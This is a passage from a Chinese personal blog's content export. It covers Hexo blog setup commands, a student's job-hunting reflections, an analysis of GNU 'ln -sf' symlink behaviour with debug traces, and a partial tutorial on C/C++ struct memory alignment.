    $ cd username.github.io　　　　　　#切换到工作目录   
    $ npm install　　　　#npm加载,从远程端加载默认配置文件到本地  
    $ hexo g　　　#生成相应的文件和文档,每次更改之后都要键入这行命令，或者直接键入hexo g -d就可生成并上传  
    $ hexo s 　　　#开启服务监听，即在本地可以访问，默认是http://localhost:4000,每次可以先在本地浏览无误后上传至github  
    $ hexo d　　　#上传至github,可以在浏览器键入username.github.io二级域名进行访问，在此之前需要配置好_config.yml文件  
    #各种插件
    npm install hexo-generator-index --save
    npm install hexo-generator-archive --save
    npm install hexo-generator-category --save
    npm install hexo-generator-tag --save
    npm install hexo-server --save
    npm install hexo-deployer-git --save
    npm install hexo-deployer-heroku --save
    npm install hexo-deployer-rsync --save
    npm install hexo-deployer-openshift --save
    npm install hexo-renderer-marked@0.2 --save
    npm install hexo-renderer-stylus@0.2 --save
    npm install hexo-generator-feed@1 --save
    npm install hexo-generator-sitemap@1 --save
    npm install hexo-generator-searchdb --save    #搜索服务
    npm install --save hexo-generator-index
    npm install --save hexo-generator-archive 
    npm install --save hexo-generator-tag
</code></pre>
<blockquote>
<p>如果出现生成之后没有看到预期的效果,可尝试<code>hexo clean; rm -rf .deploy_git; hexo g</code>来重新生成.如果用多个设备开发应该在每次编辑前应该使用<code>git pull origin hexo</code>把远程仓库最新的内容拉下来同步到本地仓库.   </p>
</blockquote>
<h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><p>按照教程更改相应参数即可，若上述命令中遇到有错误，可直接google或者按照错误打印出来的网址进行访问即可得到解决方案,下图是我的github配置,某些情况下可能需要改成使用https,但是仍然可以不必每次都输入账户名和密码(以前的配置)<br><img src="/images/git.png" alt="github配置">   </p>
<h1 id="选择主题"><a href="#选择主题" class="headerlink" title="选择主题"></a>选择主题</h1><p>我觉得加载一个好的主题对一个博客还是很重要的，所以我找了很久，官方放出来的链接在这里<a href="https://hexo.io/themes/index.html" title="theme">https://hexo.io/themes/index.html</a>,慢慢寻找吧，几乎都是开源可用的，有一些需要一些前端方面的知识．建议选择Next．pacman等经典的主题，即简单又美观.     </p>
<h1 id="编辑和发布"><a href="#编辑和发布" class="headerlink" title="编辑和发布"></a>编辑和发布</h1><p>参考前文教程装好所有的插件(评论系统，统计，打赏系统等)之后就可以自己写文章发布了，在这里注意完成菜单下的各个类别的目录的创建．比如<code>**hexo new page &quot;tags&quot;**</code>等，否则会导致访问失败．参考快速写文章的命令以及生成和发布命令可以使得写作是一种享受哦．一起来用MarkDown写博客吧.  </p>
]]></content>
      <categories>
        <category>study</category>
      </categories>
      <tags>
        <tag>Configure</tag>
      </tags>
  </entry>
  <entry>
    <title>求职艰辛路</title>
    <url>/embpgp.github.io/2016/10/17/job-summary/</url>
    <content><![CDATA[<blockquote>
<p>经过一个多月的奋战,昨天终于签约了,个人也算结束了校招吧,一路走来,倍感心酸.</p>
</blockquote>
<span id="more"></span>

<p>老吴去年心得:<a href="http://www.nephen.com/2015/11/job-summary">http://www.nephen.com/2015/11/job-summary</a></p>
<hr>
<h2 id="个人技术体系"><a href="#个人技术体系" class="headerlink" title="个人技术体系"></a>个人技术体系</h2><p>大学三年来主要的学习方向是嵌入式，编程语言主要为Asm,C/C++，用shell和python脚本开发过树莓派等的相关功能。操作系统平台为Linux,做过STM32,TI等芯片的开发，2015-2016学年在嵌入式创新基地主要学习四轴飞行器，目前开发平台为外国开源之王Pixhawk；在物联网实验室主要学习物联网作品相关技术体系，包括ZigBee，RFID，QT上位机等。对于信息安全、网络安全和软件安全亦有涉猎。</p>
<h3 id="为什么选择了嵌入式"><a href="#为什么选择了嵌入式" class="headerlink" title="为什么选择了嵌入式?"></a>为什么选择了嵌入式?</h3><p>个人对于计算机领域的起步较晚,高中及之前一直只会开关机等.大一恍恍惚惚地过了一年,基本没学啥,C和C++课程开得等于没学,数据结构和算法没好好听课….好在自己对于技术的热衷度不减,尤其是H4ck技术.大一的时候就买了<em>加密与解密</em>,<em>Windows PE权威指南</em>,<em>黑客大曝光</em>等,各种幻想,但是眼高手低,几乎看不懂里面的原理…,到大二开了数字电路的课程,瞬时间感觉底层在召唤我,所以在大二下结束的时候毅然决定加入嵌入式实验室学习.一进去直接上手stm32,买的正点原子的开发板,看着各个模块的介绍,照着提供的例程逐个地跑代码,修改代码,调试代码等.后期加入了四轴飞行器小组,担任软件组主攻手.到后来参与物联网实验室的建设,学习物联网相关技术,算是大致使得自己对整个计算机体系有了基本的认识.</p>
<h3 id="为什么涉猎安全技术"><a href="#为什么涉猎安全技术" class="headerlink" title="为什么涉猎安全技术?"></a>为什么涉猎安全技术?</h3><p>相信每个学习计算机的或多或少地对于H4ck3r有所耳闻或是冲着这个来的,但是到了大学发现实际情况并非如此.如果高校开的课程还算综合的话确实什么都会接触一点,但是都不能深入了解(谁说读大学就是学技术找工作的,详情搜索<strong>教育</strong>二字).因此如果有兴趣,你肯定会自己主动去索取相关资料的,这样学起来也是很快,当然要记得多动手.在今天这个信息化时代,安全问题已经成了普遍问题了,而非各个国家特殊组织所专有的.当然也不排除某些商业公司逆向工程竞争对手的产品来Get功能或者渗透测试对方信息系统达到某种目的.信息对抗及攻防延伸了到前所未有的高度,大型互联网公司脱裤,撞库事件层出不穷…随便去@n网搜一下,H3i产有多赚钱?未来安全产业估值不可限量,有兴趣的你还是好好学基础吧.</p>
<h3 id="为什么看起来有些xjbg"><a href="#为什么看起来有些xjbg" class="headerlink" title="为什么看起来有些xjbg"></a>为什么看起来有些xjbg</h3><p>据说计算机类相关专业考研的专业课包括<strong>数据结构</strong>,<strong>计算机组成原理</strong>,<strong>操作系统</strong>,<strong>计算机网络</strong>.我觉得挺合理的,这几门课程基本上能够概括计算机基本技术.有人会说,学那么多有用吗?企业到时候把人招进公司还不只是把一样做好就行了.现实可能是这样,但是作为一个计算机类相关专业的大学生,如果不懂原理,出了问题不知如何解决不会tm很尴尬吗?作为研究者就更加要有凡事都需要探索的精神.如果再给我一次机会重来大学的机会,我还是会贪婪地学习这么多,但是很会注重某个点.如果我架不起这个技术体系,我就会感到心虚(恨只恨起步太晚).对于面试官的问题<strong>你觉得你的优点和缺点是什么</strong>我就是实情这样回答的.因此我觉得,只要认真去搞过,那些东西都会是你的.</p>
<h2 id="如何校招"><a href="#如何校招" class="headerlink" title="如何校招?"></a>如何校招?</h2><p>首先概括:大三暑假最好去实习,或者提前批,9-10月份的校招很吃亏.都是有很鲜明的例子,具体原因可自行推理,当然类似于我们专业的神哥这样的人物除外咯.9-10月份是各大企业来校招的高峰期,期间可能会冲突很多,但是简历一定要投.模板可参考乔布,知页等(虽然泄露个人信息).内容可参考企业对相关岗位的要求照葫芦画瓢.校招来的企业可参考各大高校的就业网,最好去省会知名高校的官网看,或者直接去心仪的企业官网查看,以及各大就业网站(毕竟很多企业都是委托第三方来制作招聘网站的)等.用文字图表编辑工具记录下校招行程,包括宣讲会,笔试面试发放offer等流程的具体日期.不清楚的可以咨询自己的学长学姐,他们是过来人,不会坑你的,否则就是你请他们的饭只有一顿…</p>
<h2 id="笔试"><a href="#笔试" class="headerlink" title="笔试"></a>笔试</h2><p>关于技术岗和非技术岗的情况还是相差很远的.一般非技术岗位不需要笔试而直接进入群面环节.而技术岗一般会进行一轮笔试,内容几乎都是基础,当然也不排除大型公司提高难度.一定要把那些<strong>套路</strong>搞明白,笔试和面试都有<strong>套路</strong>.此处会省略很多字,因为在互联网上能够匹配到.把能够做的一定都做了,一般会结合笔试成绩和简历来决定是否进入下一轮环节.建议建立一个找工作的讨论组,每天发布新消息,讨论和总结相关试题等.毕竟赶场也不容易,可以多吃点儿了…</p>
<h2 id="面试"><a href="#面试" class="headerlink" title="面试"></a>面试</h2><p>笔试中不会做的题目考完之后一定要弄懂!!!这个坑不填几乎就可以直接See You Again了.一面的面试官一般还是喜欢问一些基础,比如<strong>指针和引用的异同</strong>,<strong>线程和进程的区别</strong>,<strong>#define用法</strong>,<strong>static,const用法</strong>,<strong>C++多态的实现方法</strong>,<strong>TCP时序图</strong>,<strong>各种排序,查找,遍历等的算法原理</strong>,<strong>网络编程中IO复用的情况</strong>等等,Linux的后台开发可以参考这个<a href="http://blog.csdn.net/huangjm_13/article/details/8799595">链接</a>.搞熟了就会了.技术嘛,就是不断学习和应用的过程.二面一般是压力测试,讲一些自己做过的项目,怎么做的,怎么解决问题的等,可以搞一搞<strong>剑指offer</strong>和<strong>程序员面试宝典</strong>等书籍.在和面试官交流的过程可以稍微引导一下,体现出一个循序渐进的过程.在最后,一般面试官会说:<strong>“你有什么需要问我的吗?”</strong>,这个时候很重要,或<strong>削发明志</strong>,或<strong>力挽狂澜</strong>.一定不要傻乎乎地啥都不问就走了.所以有些技巧还是需要把握的,技术能力是一个很重要的因素,但是也要注意细节.可能某些企业不怎么想去,但是也可以去笔试面试,亲身收获面经,为更好的做准备.不打无准备的仗!!!</p>
<h2 id="HR约谈"><a href="#HR约谈" class="headerlink" title="HR约谈"></a>HR约谈</h2><p>一般过了两面就会跟人力资源的HR姐姐约谈待遇和薪水问题,某些企业都是明码标价的.我是觉得应届毕业生还是应该多关注行业和自己感兴趣的技术,不能太过于强求金子,当然食宿也得考虑.找到工作仅仅只是一个开始,后面还需要不断学习新的技术和沉淀,这么早确定自己的未来有意思不?</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>感谢诸位背后的支持,在这段日子里一直有一群小伙伴一起为公共交通事业作出卓越贡献,大家能够抗住周围的压力并发挥出自己的实力,是一个成熟的过程.祝愿小伙伴们早日找到心仪的工作,继续加油!!!</p>
]]></content>
      <categories>
        <category>misc</category>
      </categories>
      <tags>
        <tag>misc</tag>
      </tags>
  </entry>
  <entry>
    <title>ln -sf target link_name</title>
    <url>/embpgp.github.io/2017/12/24/ln-sf-target-link-name/</url>
    <content><![CDATA[<blockquote>
<p>进程起不来?</p>
</blockquote>
<span id="more"></span>

<hr>
<h1 id="事因"><a href="#事因" class="headerlink" title="事因"></a>事因</h1><p>Linux下经常会创建软链接来指向真正的路径,特别是Web服务器的配置文件路径.事因是由于在bash脚本中用<code>ln -sf  target_conf_dir new_dir</code>,现象是首次执行的时候会正常创建<code>new_dir</code>,而当<code>new_dir</code>存在的时候,再次执行上述命令现象为在<code>new_dir</code>下新建了一个软链接,名字为<code>target_conf_dir</code>的base_dir,此时若<code>new_dir</code>未指向正确的链接且又用到<code>new_dir</code>的时候,错误就发生了,极有可能导致进程运行失败.</p>
<h1 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h1><h2 id="down源码"><a href="#down源码" class="headerlink" title="down源码"></a>down源码</h2><p>ln是GNU自带的工具链,因此直接去<a href="http://ftp.gnu.org/gnu/coreutils/">http://ftp.gnu.org/gnu/coreutils/</a>,可下载最新版的<code>coreutils-8.28.tar.xz</code>,解压后进入目录后经典的GNU三段式源码安装程序,即<code>configure-&gt;make-&gt;make install</code>,单独验证程序逻辑仅仅需要前面两步即可.</p>
<h2 id="大致分析ln实现"><a href="#大致分析ln实现" class="headerlink" title="大致分析ln实现"></a>大致分析ln实现</h2><p>进入src/ln.c,找到main函数,可以看<code>usage</code>函数,其实就是<code>ln --help</code>的输出.由于重点关注<code>-sf</code>参数,因此找到静态变量中对这两个参数相关的<code>remove_existing_files,interactive,symbolic_link</code>,即当<code>-sf</code>加上的时候,三个变量分别是<code>true,false,true</code>.查看代码找到关键几处,一时<code>no_target_directory</code>是否为NULL,暂时不考虑-T和-t参数,因此逻辑走到<code>!target_directory</code>的else if处,在这里将判断目标链接文件是否为目录的问题,如果命令执行的时候不加,则认为是当前目录.下创建,而&gt;2直接认为非法出<code>die</code>了,因此只能等于2,同时短路if语句去执行<code>target_directory_operand</code>函数,这个函数将直接根据是否有属于-n参数很大一部分程度来决定目标<code>target_directory</code>是否为NULL,如果有-n参数,lstat函数将取到链接文件本身,因此每次这个函数返回false,直接导致<code>target_directory</code>指针为NULL,后面将直接执行else语句<code>ok = do_link (file[0], file[1]);</code>去了.如果-n没有置位,则根据stat函数取得链接文件指向的文件看是否为目录.<code>bool is_a_dir = !err &amp;&amp; S_ISDIR (st.st_mode);</code>如果不为目录则也返回false也进入调用者的else逻辑.这些都不会导致’事故’的产生,最常见的是没加-n参数同时链接指向的是一个目录,这个时候就进入if逻辑.由于创建的是软链接,直接定位for循环,个人认为for循环是没必要的,n_files肯定为1,肯定只能执行一次.关键分析<code>file_name_concat</code>函数.</p>
<h2 id="file-name-concat"><a href="#file-name-concat" class="headerlink" title="file_name_concat"></a>file_name_concat</h2><p>首先调用者传递的参数中第一个是链接文件路径,第二个是取了<code>last_component</code>源文件路径的末尾,即不包括/之前的部分,同时第三个参数暂时没什么用.分析函数逻辑,这个函数主要是拼接路径,通过<code>DBG</code>宏定义打印,此函数将直接返回在链接目录下再生成一个链接文件指向源文件,此时很可能就违背了命令执行者的本意了.如下:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@Rutk1t0r:coreutils-8.28<span class="comment"># src/ln -sf /home/rutk1t0r/ /tmp//test/eee</span></span><br><span class="line">[src/ln.c][533 main]n_files:2</span><br><span class="line">[src/ln.c][559 main]file[n_files -1] = file[1] = /tmp//<span class="built_in">test</span>/eee</span><br><span class="line">[src/ln.c][132 target_directory_operand]err:0</span><br><span class="line">[src/ln.c][134 target_directory_operand]is_a_dir:<span class="literal">true</span></span><br><span class="line">[src/ln.c][579 main]target_dir:/tmp//<span class="built_in">test</span>/eee</span><br><span class="line">[lib/filenamecat-lgpl.c][73 mfile_name_concat][param] dir:/tmp//<span class="built_in">test</span>/eee, abase:rutk1t0r/</span><br><span class="line">[lib/filenamecat-lgpl.c][77 mfile_name_concat]dirbase:eee, dirbaselen:3, dirlen:14, needs_separator:1, base:rutk1t0r/, baselen:9</span><br><span class="line">[lib/filenamecat-lgpl.c][87 mfile_name_concat]ret value:/tmp//<span class="built_in">test</span>/eee/rutk1t0r/ ,base_in_result:rutk1t0r/</span><br><span class="line">[src/ln.c][612 main]file:/home/rutk1t0r/, dest:/tmp//<span class="built_in">test</span>/eee/rutk1t0r</span><br><span class="line">root@Rutk1t0r:coreutils-8.28<span class="comment">#</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>若加上-n参数,则执行如下:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@Rutk1t0r:coreutils-8.28<span class="comment"># src/ln -sfn /home/rutk1t0r/ /tmp//test/eee</span></span><br><span class="line">[src/ln.c][533 main]n_files:2</span><br><span class="line">[src/ln.c][559 main]file[n_files -1] = file[1] = /tmp//<span class="built_in">test</span>/eee</span><br><span class="line">[src/ln.c][132 target_directory_operand]err:0</span><br><span class="line">[src/ln.c][134 target_directory_operand]is_a_dir:<span class="literal">false</span></span><br><span class="line">[src/ln.c][579 main]target_dir:(null)</span><br><span class="line">[src/ln.c][619 main]file[0]:/home/rutk1t0r/, file[1]:/tmp//<span class="built_in">test</span>/eee</span><br><span class="line">root@Rutk1t0r:coreutils-8.28<span class="comment"># </span></span><br></pre></td></tr></table></figure>
<p>具体更改的代码见<a href="https://github.com/embpgp/gnu_coreutils-8.28">Github:https://github.com/embpgp/gnu_coreutils-8.28</a></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>个人觉得这段代码写得并不怎么样…</p>
]]></content>
      <categories>
        <category>study</category>
      </categories>
      <tags>
        <tag>coreutils</tag>
      </tags>
  </entry>
  <entry>
    <title>memory_align</title>
    <url>/embpgp.github.io/2016/08/21/memory-align/</url>
    <content><![CDATA[<h2 id="关于C-C-中结构体-类-内存对齐问题"><a href="#关于C-C-中结构体-类-内存对齐问题" class="headerlink" title="关于C/C++中结构体(类)内存对齐问题"></a>关于C/C++中结构体(类)内存对齐问题</h2><span id="more"></span>

<hr>
<blockquote>
<p>各种笔试面试都会涉及的问题，具体的可以查阅相关标准(如C99,C11等)或者翻阅国外知名论坛<a href="http://stackoverflow.com/" title="Stack Overflow">stackoverflow</a>等寻找相关资料进一步分析，我个人的一些总结如下，如有不对之处，还请诸位不吝赐教．</p>
</blockquote>
<hr>
<p>可参考资料：<br><a href="https://en.wikipedia.org/wiki/Data_structure_alignment#Problems" title="维基百科">维基百科</a><br><a href="http://stackoverflow.com/questions/2554229/memory-alignment-within-gcc-structs">StackOverflow GCC Structure</a><br><a href="https://gcc.gnu.org/onlinedocs/gcc/Type-Attributes.html">GCC文档</a></p>
<h3 id="1-首先放出现代PC编译器在实现的时候对于字长的一些典型约定"><a href="#1-首先放出现代PC编译器在实现的时候对于字长的一些典型约定" class="headerlink" title="1. 首先放出现代PC编译器在实现的时候对于字长的一些典型约定:"></a>1. 首先放出现代PC编译器在实现的时候对于字长的一些典型约定:</h3><h4 id="32位编译器："><a href="#32位编译器：" class="headerlink" title="32位编译器："></a>32位编译器：</h4><pre><code>  char ：1个字节
  char*（即指针变量）: 4个字节（32位的寻址空间是2^32, 即32个bit，也就是4个字节。同理64位编译器）
  short int : 2个字节
  int：  4个字节
  unsigned int : 4个字节
  float:  4个字节
  double:   8个字节
  long:   4个字节
  long long:  8个字节
  unsigned long:  4个字节
</code></pre>
<h4 id="64位编译器："><a href="#64位编译器：" class="headerlink" title="64位编译器："></a>64位编译器：</h4><pre><code>  char ：1个字节
  char* (即指针变量): 8个字节
  short int : 2个字节
  int：  4个字节
  unsigned int : 4个字节
  float:  4个字节
  double:   8个字节
  long:   8个字节
  long long:  8个字节
  unsigned long:  8个字节  
</code></pre>
<p>其中特别需要说明的一点就是指针类型的，任何类型的指针字长(当然包括结构体和类等复合类型)几乎应该只与编译器平台或者说是处理器地址总线长度有关(当然类似8086这种16位的处理器20根地址线的CPU等就另当别论了).关于这一点我认为学过体系结构和组成原理的同学应该会有深刻体会(我们组成原理课有实验就是按照教程实现一个简单的CPU)．在C语言中直接使用操作符sizeof(type)就可以得到字节大小，注意这个sizeof不是一个函数而是一个操作符．操作符的话表明结果已经在编译的时候确定了，而函数的话如果编译器不进行优化则等到运行时被调用才会返回值．关于这一点sizeof在有数组的参数中会发生一些奇妙的事情．</p>
<hr>
<h3 id="2-变量排放规则-自己的见解"><a href="#2-变量排放规则-自己的见解" class="headerlink" title="2. 变量排放规则(自己的见解)"></a>2. 变量排放规则(自己的见解)</h3><h4 id="1-内置类型对象-如char-lt-1字节-gt-、int-lt-现代PC编译器普遍为4字节-gt-等-的对齐起始地址为其本身大小和编译器默认大小（或用-pragma-pack（n-指定的n，一般编译器默认为8字节，可用菜单等命令修改，n一般为1-2-4-8等2的幂值）中最小的一个的整数倍"><a href="#1-内置类型对象-如char-lt-1字节-gt-、int-lt-现代PC编译器普遍为4字节-gt-等-的对齐起始地址为其本身大小和编译器默认大小（或用-pragma-pack（n-指定的n，一般编译器默认为8字节，可用菜单等命令修改，n一般为1-2-4-8等2的幂值）中最小的一个的整数倍" class="headerlink" title="1. 内置类型对象(如char&lt;1字节&gt;、int&lt;现代PC编译器普遍为4字节&gt;等)的对齐起始地址为其本身大小和编译器默认大小（或用#pragma pack（n)指定的n，一般编译器默认为8字节，可用菜单等命令修改，n一般为1,2,4,8等2的幂值）中最小的一个的整数倍."></a>1. 内置类型对象(如char&lt;1字节&gt;、int&lt;现代PC编译器普遍为4字节&gt;等)的<strong>对齐起始地址</strong>为其本身大小和编译器默认大小（或用#pragma pack（n)指定的n，一般编译器默认为8字节，可用菜单等命令修改，n一般为1,2,4,8等2的幂值）中最小的一个的整数倍.</h4><h4 id="2-整个结构体或者类的大小为它们中的内置类型大小最大的那一个和编译器默认大小（或用-pragma-pack-n-指定的n中两者较小的那个的整数倍-而当结构体或者类为定义对象的自定义类型定义时，其对齐方式参照其本身内置的最大的那个的然后再和编译器默认或声明比较中小的那个，意思说由它们中最小的那个代表它们来进行上述操作。"><a href="#2-整个结构体或者类的大小为它们中的内置类型大小最大的那一个和编译器默认大小（或用-pragma-pack-n-指定的n中两者较小的那个的整数倍-而当结构体或者类为定义对象的自定义类型定义时，其对齐方式参照其本身内置的最大的那个的然后再和编译器默认或声明比较中小的那个，意思说由它们中最小的那个代表它们来进行上述操作。" class="headerlink" title="2. 整个结构体或者类的大小为它们中的内置类型大小最大的那一个和编译器默认大小（或用#pragma pack (n)指定的n中两者较小的那个的整数倍,而当结构体或者类为定义对象的自定义类型定义时，其对齐方式参照其本身内置的最大的那个的然后再和编译器默认或声明比较中小的那个，意思说由它们中最小的那个代表它们来进行上述操作。"></a>2. 整个结构体或者类的<strong>大小</strong>为它们中的内置类型大小最大的那一个和编译器默认大小（或用#pragma pack (n)指定的n中两者较小的那个的整数倍,而当结构体或者类为定义对象的自定义类型定义时，其对齐方式参照其本身内置的最大的那个的然后再和编译器默认或声明比较中小的那个，意思说由它们中最小的那个代表它们来进行上述操作。</h4><blockquote>
<p>可能听起来很拗口，但是一旦把握了准则在应对这些问题的时候就很轻而易举了．其实主要是两个点，一个是变量放的偏移地址，另一个是复杂类型的总的大小．首先我们要知道为什么编译器需要对变量进行内存对齐？知道内存组织的童鞋可能有些感触，我们的代码运行的时候必须首先从磁盘(或其他非易失性介质)通过外部总线加载到内存中，然后再跳转到相应处运行．基于现有的计算机运行机制不断地进行<strong>取指，译码，执行等</strong>操作，由于内存本身的半导体的物理特性使得内存并不是一次性有几个G那么多而是通过很小的介质(一般是8位)不断地”串并联”起来的，一般能够保证一个地址能够寻址一个字节的数据，其实是半导体的导通与截止表示的计算机中的”1”和”0”．打个比方，如果地址不是偶数的，要取偶数个的数据的话，CPU在硬件上可能要多花几个时钟周期来进行取数据和整合，才能保证数据不出错．因此很多算法也都是以空间换时间的思想来加快计算．还有就是在嵌入式领域，由于板子或者芯片本身的内存资源非常有限，必须要求嵌入式程序员写出几乎<code>磕碜</code>的代码才能保证运行流畅等．因此，至少在不怎么缺内存的PC或者Server领域，为了加快计算，还是可以采用编译器进行的优化的．(可能还有其他技术比如缓存啥的我们先不讨论)</p>
</blockquote>
<h3 id="3-Win栗子如下："><a href="#3-Win栗子如下：" class="headerlink" title="3. Win栗子如下："></a>3. Win栗子如下：</h3><h4 id="1-这是以前我用Win的时候VC-6-0编译器的效果图"><a href="#1-这是以前我用Win的时候VC-6-0编译器的效果图" class="headerlink" title="1. 这是以前我用Win的时候VC++ 6.0编译器的效果图"></a>1. 这是以前我用Win的时候VC++ 6.0编译器的效果图</h4><p><img src="/images/1.png" alt="配置"></p>
<h4 id="2-此处说明int类型的b在排位置的时候放到了偏移处为4的倍数，而非数据填充a剩下的"><a href="#2-此处说明int类型的b在排位置的时候放到了偏移处为4的倍数，而非数据填充a剩下的" class="headerlink" title="2. 此处说明int类型的b在排位置的时候放到了偏移处为4的倍数，而非数据填充a剩下的"></a>2. 此处说明int类型的b在排位置的时候放到了偏移处为4的倍数，而非数据填充a剩下的</h4><p><img src="/images/2.png" alt="int b"></p>
<h4 id="3-下面这一处说明大小是按照int类型-最大呀-的整数倍来取"><a href="#3-下面这一处说明大小是按照int类型-最大呀-的整数倍来取" class="headerlink" title="3. 下面这一处说明大小是按照int类型(最大呀)的整数倍来取"></a>3. 下面这一处说明大小是按照int类型(最大呀)的整数倍来取</h4><p><img src="/images/3.png" alt="整数倍"></p>
<h4 id="4-说明当类型为数组的时候，只按照它的类型来对齐而非整个大小"><a href="#4-说明当类型为数组的时候，只按照它的类型来对齐而非整个大小" class="headerlink" title="4. 说明当类型为数组的时候，只按照它的类型来对齐而非整个大小"></a>4. 说明当类型为数组的时候，只按照它的类型来对齐而非整个大小</h4><p><img src="/images/4.png" alt="数组"></p>
<h4 id="5-说明第二个元素char类型的可以在任何偏移处安放-因为它是一个字节啊"><a href="#5-说明第二个元素char类型的可以在任何偏移处安放-因为它是一个字节啊" class="headerlink" title="5. 说明第二个元素char类型的可以在任何偏移处安放(因为它是一个字节啊)"></a>5. 说明第二个元素char类型的可以在任何偏移处安放(因为它是一个字节啊)</h4><p><img src="/images/5.png" alt="char"></p>
<h4 id="6-说明-pragma-pack-n-n非2的幂的值时候无效"><a href="#6-说明-pragma-pack-n-n非2的幂的值时候无效" class="headerlink" title="6. 说明#pragma pack (n) n非2的幂的值时候无效"></a>6. 说明#pragma pack (n) n非2的幂的值时候无效</h4><p><img src="/images/6.png" alt="#pragma pack (n)"></p>
<h4 id="7-说明结构体作为一个类型在插入时候是以它自己有的最大字节元素来参考放的偏移．然后总的大小是8的倍数"><a href="#7-说明结构体作为一个类型在插入时候是以它自己有的最大字节元素来参考放的偏移．然后总的大小是8的倍数" class="headerlink" title="7. 说明结构体作为一个类型在插入时候是以它自己有的最大字节元素来参考放的偏移．然后总的大小是8的倍数"></a>7. 说明结构体作为一个类型在插入时候是以它自己有的最大字节元素来参考放的偏移．然后总的大小是8的倍数</h4><p><img src="/images/7.png" alt="struct"></p>
<h4 id="8-说明pragma-pack-3-没作用"><a href="#8-说明pragma-pack-3-没作用" class="headerlink" title="8. 说明pragma pack (3)没作用"></a>8. 说明pragma pack (3)没作用</h4><p><img src="/images/8.png" alt="pack (3)"></p>
<h3 id="4-Linux栗子如下-据说gcc默认是4-bytes的对齐大小-："><a href="#4-Linux栗子如下-据说gcc默认是4-bytes的对齐大小-：" class="headerlink" title="4. Linux栗子如下(据说gcc默认是4 bytes的对齐大小)："></a>4. Linux栗子如下(据说gcc默认是4 bytes的对齐大小)：</h3><h4 id="1-这是我用ubuntu-16-04-amd64-ssh连接ubuntu-16-04-i386之后gcc版本号"><a href="#1-这是我用ubuntu-16-04-amd64-ssh连接ubuntu-16-04-i386之后gcc版本号" class="headerlink" title="1. 这是我用ubuntu 16.04 amd64 ssh连接ubuntu 16.04 i386之后gcc版本号:"></a>1. 这是我用ubuntu 16.04 amd64 ssh连接ubuntu 16.04 i386之后gcc版本号:</h4><p><img src="/images/gcc-st-1.png" alt="gcc -v"></p>
<h4 id="2-这个应该默认是4字节的对齐，大小和元素中最大的int比还是4字节"><a href="#2-这个应该默认是4字节的对齐，大小和元素中最大的int比还是4字节" class="headerlink" title="2. 这个应该默认是4字节的对齐，大小和元素中最大的int比还是4字节"></a>2. 这个应该默认是4字节的对齐，大小和元素中最大的int比还是4字节</h4><p><img src="/images/gcc-st-2.png" alt="4 butys"></p>
<h4 id="3-在gcc中加入功能和pragma-pack差不多的-attribute-选项即可要求编译器改变默认对齐大小，当值为1时，几乎没有空间浪费，但是用起来的时候却去坑CPU了…"><a href="#3-在gcc中加入功能和pragma-pack差不多的-attribute-选项即可要求编译器改变默认对齐大小，当值为1时，几乎没有空间浪费，但是用起来的时候却去坑CPU了…" class="headerlink" title="3. 在gcc中加入功能和pragma pack差不多的__attribute__选项即可要求编译器改变默认对齐大小，当值为1时，几乎没有空间浪费，但是用起来的时候却去坑CPU了…"></a>3. 在gcc中加入功能和pragma pack差不多的__attribute__选项即可要求编译器改变默认对齐大小，当值为1时，几乎没有空间浪费，但是用起来的时候却去坑CPU了…</h4><p><img src="/images/gcc-st-3.png" alt="attri_1"></p>
<h4 id="4-在这里只是a之后的那一个字节是填充的-short只要是偶数偏移就可以插入咯，int在这里其实也是偶数，只是恰好放在4的倍数偏移处而已，-attribute-干得好事"><a href="#4-在这里只是a之后的那一个字节是填充的-short只要是偶数偏移就可以插入咯，int在这里其实也是偶数，只是恰好放在4的倍数偏移处而已，-attribute-干得好事" class="headerlink" title="4. 在这里只是a之后的那一个字节是填充的,short只要是偶数偏移就可以插入咯，int在这里其实也是偶数，只是恰好放在4的倍数偏移处而已，__attribute__干得好事~"></a>4. 在这里只是a之后的那一个字节是填充的,short只要是偶数偏移就可以插入咯，int在这里其实也是偶数，只是恰好放在4的倍数偏移处而已，__attribute__干得好事~</h4><p><img src="/images/gcc-st-4.png" alt="attri_2"></p>
<h4 id="5-证明了有pack为1的地方必定不留一点空隙"><a href="#5-证明了有pack为1的地方必定不留一点空隙" class="headerlink" title="5. 证明了有pack为1的地方必定不留一点空隙~~~"></a>5. 证明了有pack为1的地方必定不留一点空隙~~~</h4><p><img src="/images/gcc-st-5.png" alt="pack_1"></p>
<h4 id="6-第一个foo结构体虽然double为8字节，但是由于默认为4字节的对齐，所以根据对齐原则取两者中较小的对结构体大小倍数，因此为12字节．第二个结构体bar插入了第一个结构体，因此结构体d放在哪儿呢-应该是它自己作为结构体的时候元素中最大的-这个栗子为double-要是有char-类型数组超过8，不用管，认为是char-和默认的4相比，还是取较小的为偏移处防止，所以short之后空两个就可以插入了．大小也是一样，直接占12字节就是了．后面的参照规则即可得出．"><a href="#6-第一个foo结构体虽然double为8字节，但是由于默认为4字节的对齐，所以根据对齐原则取两者中较小的对结构体大小倍数，因此为12字节．第二个结构体bar插入了第一个结构体，因此结构体d放在哪儿呢-应该是它自己作为结构体的时候元素中最大的-这个栗子为double-要是有char-类型数组超过8，不用管，认为是char-和默认的4相比，还是取较小的为偏移处防止，所以short之后空两个就可以插入了．大小也是一样，直接占12字节就是了．后面的参照规则即可得出．" class="headerlink" title="6. 第一个foo结构体虽然double为8字节，但是由于默认为4字节的对齐，所以根据对齐原则取两者中较小的对结构体大小倍数，因此为12字节．第二个结构体bar插入了第一个结构体，因此结构体d放在哪儿呢?应该是它自己作为结构体的时候元素中最大的(这个栗子为double,要是有char 类型数组超过8，不用管，认为是char)和默认的4相比，还是取较小的为偏移处防止，所以short之后空两个就可以插入了．大小也是一样，直接占12字节就是了．后面的参照规则即可得出．"></a>6. 第一个foo结构体虽然double为8字节，但是由于默认为4字节的对齐，所以根据对齐原则取两者中较小的对结构体大小倍数，因此为12字节．第二个结构体bar插入了第一个结构体，因此结构体d放在哪儿呢?应该是它自己作为结构体的时候元素中最大的(这个栗子为double,要是有char 